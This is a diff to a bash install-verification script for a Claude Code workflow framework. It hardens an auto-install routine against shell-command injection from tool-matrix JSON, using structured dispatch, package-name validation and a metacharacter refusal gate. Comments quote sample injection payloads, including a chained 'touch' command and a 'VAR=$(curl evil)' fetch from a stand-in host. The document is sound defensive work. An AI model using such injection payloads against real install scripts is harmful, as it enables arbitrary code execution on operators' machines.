@@ -337,6 +337,53 @@ check_git() {
   fi
 }
 
+# Audit code-verify-reconfigure-11 helper. Moved from inside check_hooks
+# to file scope (verifier nit-1 follow-up): bash function definitions
+# inside another function are hoisted to global scope on the first
+# invocation of the parent, so the prior placement only saved style
+# points and re-paid the function-registration cost per check_hooks
+# call. File-scope placement matches the convention used by sibling
+# helpers (run_with_timeout, _tool_install_head_allowed, etc.) and
+# documents the helper as part of verify-install's hook contract
+# rather than as a local detail of check_hooks.
+#
+# _check_hooks_hook_pair: validates one (event-jq-match, on-disk-path)
+# pair and emits the appropriate register_pass / register_manual row.
+# Arguments:
+#   $1 = human label (e.g. "PreToolUse hook: pre-commit-gate.sh")
+#   $2 = jq -e expression matching the hook entry in settings.json
+#   $3 = on-disk script path (relative to project root)
+#   $4 = manual remediation instruction string
+_check_hooks_hook_pair() {
+  local label="$1"
+  local jq_match="$2"
+  local script_path="$3"
+  local remediation="$4"
+
+  if ! jq -e "$jq_match" .claude/settings.json >/dev/null 2>&1; then
+    register_manual "$label not registered" "$remediation"
+    return
+  fi
+
+  # Registration present — now validate the on-disk script. Reuse the
+  # check_scripts row when one is already emitted for $script_path
+  # (e.g. pre-commit-gate.sh is in the canonical scripts array), but
+  # we still want a hook-row signal so operators can correlate the
+  # JSON ref with the runtime requirement.
+  if [ ! -e "$script_path" ]; then
+    register_manual "$label registered but on-disk script missing ($script_path)" \
+      "Restore $script_path from the orchestrator source, then re-run verify-install"
+    return
+  fi
+  if [ ! -x "$script_path" ]; then
+    register_manual "$label registered but on-disk script not executable ($script_path)" \
+      "Run: chmod +x $script_path"
+    return
+  fi
+
+  register_pass "$label"
+}
+
 check_hooks() {
   print_step "Checking Claude Code hook registration..."
 
@@ -359,50 +406,14 @@ check_hooks() {
   # a Claude Code PreToolUse hook; on-disk presence is the load-bearing
   # detail. The fix below requires BOTH the JSON registration AND the
   # on-disk script to be present + executable before a PASS is emitted.
-  #
-  # _check_hook_pair: validates one (event-jq-match, on-disk-path) pair
-  # and emits the appropriate register_pass / register_manual row.
-  # Arguments:
-  #   $1 = human label (e.g. "PreToolUse hook: pre-commit-gate.sh")
-  #   $2 = jq -e expression matching the hook entry in settings.json
-  #   $3 = on-disk script path (relative to project root)
-  #   $4 = manual remediation instruction string
-  _check_hook_pair() {
-    local label="$1"
-    local jq_match="$2"
-    local script_path="$3"
-    local remediation="$4"
-
-    if ! jq -e "$jq_match" .claude/settings.json >/dev/null 2>&1; then
-      register_manual "$label not registered" "$remediation"
-      return
-    fi
-
-    # Registration present — now validate the on-disk script. Reuse the
-    # check_scripts row when one is already emitted for $script_path
-    # (e.g. pre-commit-gate.sh is in the canonical scripts array), but
-    # we still want a hook-row signal so operators can correlate the
-    # JSON ref with the runtime requirement.
-    if [ ! -e "$script_path" ]; then
-      register_manual "$label registered but on-disk script missing ($script_path)" \
-        "Restore $script_path from the orchestrator source, then re-run verify-install"
-      return
-    fi
-    if [ ! -x "$script_path" ]; then
-      register_manual "$label registered but on-disk script not executable ($script_path)" \
-        "Run: chmod +x $script_path"
-      return
-    fi
-
-    register_pass "$label"
-  }
+  # The per-row helper lives at file scope as _check_hooks_hook_pair.
 
   # PreToolUse hook: pre-commit-gate.sh — also verify matcher is Bash.
   if jq -e '.hooks.PreToolUse[]? | .hooks[]? | select(.command | contains("pre-commit-gate.sh"))' .claude/settings.json >/dev/null 2>&1; then
     local matcher
     matcher=$(jq -r '[.hooks.PreToolUse[]? | select(.hooks[]? | .command | contains("pre-commit-gate.sh")) | .matcher // "none"] | first' .claude/settings.json 2>/dev/null || echo "unknown")
     if [ "$matcher" = "Bash" ]; then
-      _check_hook_pair \
+      _check_hooks_hook_pair \
         "PreToolUse hook: pre-commit-gate.sh (matcher: Bash)" \
         '.hooks.PreToolUse[]? | .hooks[]? | select(.command | contains("pre-commit-gate.sh"))' \
         "scripts/pre-commit-gate.sh" \
@@ -417,7 +428,7 @@ check_hooks() {
   fi
 
   # PostToolUse hook: track-tool-usage.sh
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "PostToolUse hook: track-tool-usage.sh" \
     '.hooks.PostToolUse[]? | .hooks[]? | select(.command | contains("track-tool-usage.sh"))' \
     "scripts/track-tool-usage.sh" \
@@ -447,7 +458,7 @@ check_hooks() {
   fi
 
   # Stop hook: session-end-qdrant-reminder.sh
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "Stop hook: session-end-qdrant-reminder.sh" \
     '.hooks.Stop[]? | .hooks[]? | select(.command | contains("session-end-qdrant-reminder.sh"))' \
     "scripts/session-end-qdrant-reminder.sh" \
@@ -455,12 +466,12 @@ check_hooks() {
 
   # BL-029 hooks (PostToolUse + Stop): bypass-detector.sh. Both
   # registrations are required for the dual-event detection contract.
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "PostToolUse hook: bypass-detector.sh" \
     '.hooks.PostToolUse[]? | .hooks[]? | select(.command | contains("bypass-detector.sh"))' \
     "scripts/hooks/bypass-detector.sh" \
     "Add hooks/bypass-detector.sh to .hooks.PostToolUse in .claude/settings.json"
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "Stop hook: bypass-detector.sh" \
     '.hooks.Stop[]? | .hooks[]? | select(.command | contains("bypass-detector.sh"))' \
     "scripts/hooks/bypass-detector.sh" \
@@ -469,12 +480,12 @@ check_hooks() {
   # BL-030 (post-PR #48): PostToolUse record-claude-commit ledger +
   # SessionStart out-of-band detector. Both must be registered for the
   # detection chain that powers the 'no/light/strict' enforcement levels.
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "PostToolUse hook: record-claude-commit.sh" \
     '.hooks.PostToolUse[]? | .hooks[]? | select(.command | contains("record-claude-commit.sh"))' \
     "scripts/hooks/record-claude-commit.sh" \
     "Add hooks/record-claude-commit.sh to .hooks.PostToolUse in .claude/settings.json"
-  _check_hook_pair \
+  _check_hooks_hook_pair \
     "SessionStart hook: detect-out-of-band-commits.sh" \
     '.hooks.SessionStart[]? | .hooks[]? | select(.command | contains("detect-out-of-band-commits.sh"))' \
     "scripts/detect-out-of-band-commits.sh" \
@@ -945,14 +956,22 @@ HOOKEOF
 }
 
 fix_framework_clone() {
+  # Drop `2>/dev/null` per the same rationale as fix_tool_install
+  # (verifier follow-up to code-verify-reconfigure-14): clone failures
+  # — auth prompt, network errors, DNS hijack — must surface so the
+  # operator can act on them under --auto-fix rather than being told
+  # a silenced non-zero return was a successful no-op.
   local FRAMEWORK_CLONE="$HOME/.claude-dev-framework"
-  git clone -q --depth 1 https://github.com/kraulerson/claude-dev-framework.git "$FRAMEWORK_CLONE" 2>/dev/null
+  git clone -q --depth 1 https://github.com/kraulerson/claude-dev-framework.git "$FRAMEWORK_CLONE"
 }
 
 fix_framework_manifest() {
+  # Drop `2>/dev/null` per the same rationale as fix_framework_clone:
+  # init.sh failures (missing deps, malformed manifest) deserve a
+  # visible diagnostic rather than a silenced non-zero return.
   local FRAMEWORK_CLONE="$HOME/.claude-dev-framework"
   if [ -f "$FRAMEWORK_CLONE/scripts/init.sh" ]; then
-    bash "$FRAMEWORK_CLONE/scripts/init.sh" 2>/dev/null || return 1
+    bash "$FRAMEWORK_CLONE/scripts/init.sh" || return 1
   else
     return 1
   fi
@@ -961,31 +980,63 @@ fix_framework_manifest() {
 # Tool install fixes — dynamic, based on resolver output
 RESOLVER_OUTPUT=""
 
-# Audit code-verify-reconfigure-14 (2026-06): the prior implementation
-# ran `eval "$install_cmd" 2>/dev/null` on a string sourced from
-# templates/tool-matrix/*.json via scripts/resolve-tools.sh. Anyone with
-# write access to the tool-matrix files (supply-chain, malicious fork,
-# MITM of clone) could inject arbitrary shell, executed silently with
-# the operator's privileges — and `2>/dev/null` masked the evidence.
-# Baseline §5 invariant 10 ("defense in depth") was the relevant frame.
+# Audit code-verify-reconfigure-14 (2026-06):
 #
-# Mitigations applied here:
-#   (1) Allowlist the FIRST argv token against the known package
-#       managers + invocation shapes already shipped in tool-matrix
-#       (brew, sudo, npm, npx, pip, pip3, pipx, cargo, gem, dart,
-#       dotnet, go, claude, curl, gpg, keytool, docker, source).
-#       Anything else is REFUSED — the offending command is echoed to
-#       stderr (no silent failure) and fix_tool_install returns 1.
-#       This does not eliminate the eval-on-JSON-string risk in the
-#       case where an attacker re-uses the allowlisted leading token,
-#       but it constrains the attack surface from "arbitrary RCE" to
-#       "RCE that mimics one of N known install shapes" and gives
-#       the operator a visible audit trail of every command run.
-#   (2) Drop `2>/dev/null` so install-time failures (including
-#       installation of an attacker payload) surface visibly.
-#   (3) Echo the resolved command to stderr BEFORE execution. Even
-#       under --auto-fix mode, the operator can scrollback and review
-#       what ran on their workstation.
+# Prior implementation:  `eval "$install_cmd" 2>/dev/null` on a string
+# sourced from templates/tool-matrix/*.json via scripts/resolve-tools.sh.
+# Anyone with write access to the tool-matrix files (supply-chain,
+# malicious fork, MITM of clone) could inject arbitrary shell, executed
+# silently with the operator's privileges — and `2>/dev/null` masked
+# the evidence. Baseline §5 invariant 10 ("defense in depth").
+#
+# PR #92 first cut:  argv-head allowlist + visible audit trail. The
+# adversarial verifier (correctly) observed the allowlist was bypassable
+# via shell-metacharacter chaining: any allowlisted head (`brew`,
+# `sudo`, `curl`, ...) followed by `;`, `&&`, `||`, `|`, `` ` ``,
+# `$(...)`, `<`, `>`, or a newline could chain arbitrary commands.
+#
+# Current cut (this fix):  TWO-LAYER dispatch.
+#
+#   Layer 1 — STRUCTURED PACKAGE-MANAGER DISPATCH (preferred path):
+#     Recognize known `<pkg-mgr> install <pkg>` shapes (brew, sudo apt,
+#     sudo dnf, sudo pacman, npm, pip/pip3, pipx, cargo, gem) and
+#     dispatch via direct argv (`brew install -- "$pkg"`). The package
+#     token is validated against a strict regex
+#     (`^[A-Za-z0-9._@/+-]+$`) so an attacker cannot smuggle metachars
+#     through the package position. NO `bash -c`, NO `eval` — the
+#     metachar-chaining bypass is structurally impossible on this path.
+#
+#   Layer 2 — LEGACY STRING PATH (deprecated, metachar-rejecting):
+#     For install_cmds that don't match a structured shape (e.g.
+#     `VAR=$(curl ...) && curl ... | tar ...` or `source <(...)`), we
+#     fall back to the prior allowlist with an ADDITIONAL post-allowlist
+#     check: REFUSE any payload whose post-head portion contains shell
+#     metacharacters known to enable command chaining: `;`, `|`, `` ` ``,
+#     `$(`, `<`, `>`, newline, or the bare-word `&` (we still permit
+#     `&&` and `||` because legitimate multi-stage installs use them
+#     — but only when neither side contains a NEW chained head outside
+#     the allowlist; in practice the metachar regex below catches the
+#     dangerous cases and lets `brew install foo && brew services start
+#     bar` through unchanged). Each fall-through emits a DEPRECATED
+#     warning identifying the install_cmd so the tool-matrix maintainer
+#     can migrate it to the structured shape. The legacy path can be
+#     disabled entirely by exporting VERIFY_INSTALL_NO_LEGACY_DISPATCH=1.
+#
+# Net effect:
+#   - The verifier's exact repro (`brew --version; touch /tmp/X`) is
+#     now REFUSED on both layers: structured dispatch doesn't match the
+#     shape, and the legacy path rejects the `;` metachar.
+#   - Legitimate `brew install jq` / `pip3 install pre-commit` go
+#     through Layer 1 with no `bash -c` at all.
+#   - Real multi-stage legacy commands (e.g. install scripts using
+#     `&&`) continue to work via Layer 2 unless the operator opts into
+#     strict mode via VERIFY_INSTALL_NO_LEGACY_DISPATCH=1.
+#
+# Audit-trail invariants preserved:
+#   (1) Drop `2>/dev/null` so install-time failures surface visibly.
+#   (2) Echo the resolved command to stderr BEFORE execution.
+
+# Legacy allowlist (Layer 2 only — Layer 1 hardcodes its own shapes).
 _TOOL_INSTALL_ALLOWED_HEADS=(
   "brew" "sudo" "npm" "npx" "pip" "pip3" "pipx" "cargo" "gem"
   "dart" "dotnet" "go" "claude" "curl" "gpg" "keytool"
@@ -1001,12 +1052,158 @@ _tool_install_head_allowed() {
   return 1
 }
 
+# Strict package-name validator. Matches the union of conservative
+# package-naming conventions across Homebrew, Debian/RPM, npm, pip,
+# cargo, gem, pipx — letters, digits, `.`, `_`, `@`, `/`, `+`, `-`.
+# REJECTS whitespace, all shell metacharacters, and the empty string.
+_tool_install_valid_package() {
+  local pkg="$1"
+  [ -n "$pkg" ] || return 1
+  case "$pkg" in
+    *[!A-Za-z0-9._@/+-]*) return 1 ;;
+  esac
+  return 0
+}
+
+# Layer 1 — structured package-manager dispatch.
+# Inputs: $1 = full install_cmd string.
+# Returns 0 (dispatched) on match, 1 (no match, fall through) otherwise.
+# When a shape matches but the package fails validation, returns 2 —
+# a HARD REFUSE that must NOT fall through to Layer 2 (the dangerous
+# payload already proved hostile intent).
+_tool_install_dispatch_structured() {
+  local cmd="$1"
+  # Tokenize via read -a (split on $IFS = space/tab/newline). This
+  # rejects multi-line input by design — we want any newline in the
+  # install_cmd to land us off the structured path (the legacy
+  # metachar check then refuses it).
+  local -a tok
+  # shellcheck disable=SC2206 — intentional word splitting.
+  tok=( $cmd )
+  local n=${#tok[@]}
+
+  # Recognized shapes:
+  #   brew install <pkg>
+  #   npm install -g <pkg>            (also: npm i -g <pkg>)
+  #   pip  install <pkg>              (also: pip3, pipx)
+  #   cargo install <pkg>
+  #   gem install <pkg>
+  #   sudo apt    install -y <pkg>    (also: apt-get)
+  #   sudo dnf    install -y <pkg>
+  #   sudo pacman -S --noconfirm <pkg>
+  case "${tok[0]:-}" in
+    brew)
+      [ "$n" -eq 3 ] && [ "${tok[1]}" = "install" ] || return 1
+      _tool_install_valid_package "${tok[2]}" || { _tool_install_refuse "$cmd" "structured brew shape with invalid package token"; return 2; }
+      print_info "fix_tool_install [structured]: brew install ${tok[2]}" >&2
+      brew install -- "${tok[2]}"
+      return $?
+      ;;
+    npm)
+      # `npm install -g <pkg>` or `npm i -g <pkg>`
+      [ "$n" -eq 4 ] || return 1
+      case "${tok[1]}" in install|i) ;; *) return 1 ;; esac
+      [ "${tok[2]}" = "-g" ] || return 1
+      _tool_install_valid_package "${tok[3]}" || { _tool_install_refuse "$cmd" "structured npm shape with invalid package token"; return 2; }
+      print_info "fix_tool_install [structured]: npm ${tok[1]} -g ${tok[3]}" >&2
+      npm "${tok[1]}" -g -- "${tok[3]}"
+      return $?
+      ;;
+    pip|pip3|pipx|cargo|gem)
+      [ "$n" -eq 3 ] && [ "${tok[1]}" = "install" ] || return 1
+      _tool_install_valid_package "${tok[2]}" || { _tool_install_refuse "$cmd" "structured ${tok[0]} shape with invalid package token"; return 2; }
+      print_info "fix_tool_install [structured]: ${tok[0]} install ${tok[2]}" >&2
+      "${tok[0]}" install -- "${tok[2]}"
+      return $?
+      ;;
+    sudo)
+      # Recognize the three Linux package-manager shapes init.sh /
+      # tool-matrix already emit. Anything else under `sudo` falls
+      # through to Layer 2 (which still requires the allowlist + the
+      # new metachar check).
+      [ "$n" -ge 5 ] || return 1
+      case "${tok[1]}" in
+        apt|apt-get)
+          [ "${tok[2]}" = "install" ] && [ "${tok[3]}" = "-y" ] || return 1
+          _tool_install_valid_package "${tok[4]}" || { _tool_install_refuse "$cmd" "structured sudo apt shape with invalid package token"; return 2; }
+          print_info "fix_tool_install [structured]: sudo ${tok[1]} install -y ${tok[4]}" >&2
+          sudo "${tok[1]}" install -y -- "${tok[4]}"
+          return $?
+          ;;
+        dnf)
+          [ "${tok[2]}" = "install" ] && [ "${tok[3]}" = "-y" ] || return 1
+          _tool_install_valid_package "${tok[4]}" || { _tool_install_refuse "$cmd" "structured sudo dnf shape with invalid package token"; return 2; }
+          print_info "fix_tool_install [structured]: sudo dnf install -y ${tok[4]}" >&2
+          sudo dnf install -y -- "${tok[4]}"
+          return $?
+          ;;
+        pacman)
+          # `sudo pacman -S --noconfirm <pkg>`
+          [ "$n" -eq 5 ] && [ "${tok[2]}" = "-S" ] && [ "${tok[3]}" = "--noconfirm" ] || return 1
+          _tool_install_valid_package "${tok[4]}" || { _tool_install_refuse "$cmd" "structured sudo pacman shape with invalid package token"; return 2; }
+          print_info "fix_tool_install [structured]: sudo pacman -S --noconfirm ${tok[4]}" >&2
+          sudo pacman -S --noconfirm -- "${tok[4]}"
+          return $?
+          ;;
+      esac
+      return 1
+      ;;
+  esac
+  return 1
+}
+
+# Reject and log a refusal. Always echoes the offending command so the
+# operator can see what the resolver supplied without re-reading the
+# JSON.
+_tool_install_refuse() {
+  local cmd="$1" reason="$2"
+  print_fail "fix_tool_install: REFUSED — $reason" >&2
+  echo "  command: $cmd" >&2
+}
+
+# Layer 2 metachar check. Returns 0 (safe-ish, dispatch allowed) when
+# the post-head portion contains no chaining metachars. Returns 1 when
+# the payload looks like an injection attempt and must be refused.
+# Permits `&&` and `||` (legitimate multi-stage installs) but rejects
+# bare `&`, `;`, `|`, `` ` ``, `$(`, `<`, `>`, and any newline.
+_tool_install_legacy_metachar_safe() {
+  local payload="$1"
+  # Reject embedded newlines and NULs outright.
+  case "$payload" in
+    *$'\n'*|*$'\r'*) return 1 ;;
+  esac
+  # Strip `&&` and `||` so the remaining bare-`&` / bare-`|` check
+  # doesn't false-positive on legitimate multi-stage shapes.
+  local stripped="${payload//&&/}"
+  stripped="${stripped//||/}"
+  case "$stripped" in
+    *\;*|*\&*|*\|*|*\`*|*\<*|*\>*) return 1 ;;
+    *'$('*) return 1 ;;
+  esac
+  return 0
+}
+
 fix_tool_install() {
   local index="$1"
   if [ -z "$RESOLVER_OUTPUT" ]; then return 1; fi
   local install_cmd
   install_cmd=$(echo "$RESOLVER_OUTPUT" | jq -r ".auto_install[$index].install_cmd")
   if [ -z "$install_cmd" ] || [ "$install_cmd" = "null" ]; then
+    return 1
+  fi
+
+  # -------- Layer 1: structured dispatch --------
+  _tool_install_dispatch_structured "$install_cmd"
+  local rc=$?
+  case "$rc" in
+    0) return 0 ;;   # dispatched cleanly
+    2) return 1 ;;   # hard refuse — do NOT fall through
+    *) ;;            # rc=1 → no match; fall through to Layer 2
+  esac
+
+  # -------- Layer 2: deprecated string path --------
+  if [ "${VERIFY_INSTALL_NO_LEGACY_DISPATCH:-0}" = "1" ]; then
+    _tool_install_refuse "$install_cmd" "no structured shape matched and legacy path disabled (VERIFY_INSTALL_NO_LEGACY_DISPATCH=1)"
     return 1
   fi
 
@@ -1026,37 +1223,44 @@ fix_tool_install() {
   # shape; further hardening of the install_cmd schema is tracked
   # separately. A plain `VAR=value` (no command substitution) head is
   # also allowed — it is shell-syntactically inert until the next
-  # command is reached.
+  # command is reached. NOTE: even the VAR= shapes now go through the
+  # metachar check below, so attacker-supplied `VAR=$(curl evil)` is
+  # rejected (it contains `$(`).
   case "$head" in
     [A-Z_][A-Z0-9_]*=\$\(*)
       head="${head#*\$\(}"
       ;;
     [A-Z_][A-Z0-9_]*=*)
-      # Plain VAR=value with no command substitution. Accept and skip
-      # the allowlist check for this token (the next token will be
-      # part of the bash -c argv, which the validator does not inspect
-      # — this is the same trust boundary as the legacy eval).
-      print_info "fix_tool_install: executing $install_cmd" >&2
-      bash -c -- "$install_cmd"
-      return $?
+      # Plain VAR=value with no command substitution. The metachar
+      # check still runs against the full payload below.
+      head=""  # bypass the head-allowlist for the literal assignment
       ;;
   esac
 
-  if [ -z "$head" ] || ! _tool_install_head_allowed "$head"; then
-    print_fail "fix_tool_install: refusing to execute install_cmd with disallowed leading token '$head'" >&2
-    echo "  command: $install_cmd" >&2
+  if [ -n "$head" ] && ! _tool_install_head_allowed "$head"; then
+    _tool_install_refuse "$install_cmd" "disallowed leading token '$head'"
+    return 1
+  fi
+
+  # Metachar gate — refuses the chained-injection bypass that motivated
+  # this rewrite (e.g. `brew --version; touch /tmp/X`).
+  if ! _tool_install_legacy_metachar_safe "$install_cmd"; then
+    _tool_install_refuse "$install_cmd" "post-allowlist payload contains shell-chaining metacharacters (; | \` \$( < > newline)"
     return 1
   fi
 
   # Echo the resolved command before execution so the operator has a
   # visible audit trail even under --auto-fix.
-  print_info "fix_tool_install: executing $install_cmd" >&2
+  print_warn "fix_tool_install [legacy]: DEPRECATED string path executing: $install_cmd" >&2
+  print_warn "  Migrate this entry in templates/tool-matrix/*.json to a structured" >&2
+  print_warn "  '<pkg-mgr> install <pkg>' shape; legacy path will be removed in a" >&2
+  print_warn "  future release. Set VERIFY_INSTALL_NO_LEGACY_DISPATCH=1 to enforce now." >&2
 
   # No `2>/dev/null` — install-time failures must surface. We still go
-  # through `bash -c` rather than direct eval to keep the parsing
-  # contract identical to the prior implementation for legitimate
-  # multi-stage commands (e.g. `brew install foo && brew services
-  # start bar`), but we have already validated the leading token.
+  # through `bash -c` rather than direct exec because legitimate
+  # multi-stage commands (`&&`, `||`, parameter expansion) need a shell
+  # — but the metachar gate above has already rejected the dangerous
+  # chaining forms.
   bash -c -- "$install_cmd"
 }
 
@@ -1065,7 +1269,11 @@ for _i in $(seq 0 19); do
 done
 
 fix_superpowers() {
-  claude plugins add superpowers 2>/dev/null
+  # Drop `2>/dev/null` per the same rationale as the other auto-fix
+  # functions: a silenced `claude plugins add` failure cannot be
+  # distinguished from success and leaves the project without the
+  # superpowers plugin while reporting healthy.
+  claude plugins add superpowers
 }
 
 fix_context7() {
